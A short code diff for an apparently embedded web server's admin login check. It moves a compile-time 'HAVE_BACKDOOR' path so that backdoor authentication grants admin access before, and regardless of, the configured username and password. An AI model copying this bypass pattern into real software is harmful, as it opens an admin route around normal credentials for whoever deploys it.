@@ -53,11 +53,11 @@ void webserver_clearPreferences() {
 }
 
 bool webserver_admin_auth() {
+#ifdef HAVE_BACKDOOR
+  if (backdoor.configured() && backdoor.authenticated()) return true;
+#endif
   if (webserver_admin_username[0] && webserver_admin_password[0]) {
     if (webserver.authenticate(webserver_admin_username, webserver_admin_password)) return true;
-#ifdef HAVE_BACKDOOR
-    if (backdoor.backdoor_authenticated()) return true;
-#endif
     webserver.requestAuthentication();
     return false;
   }
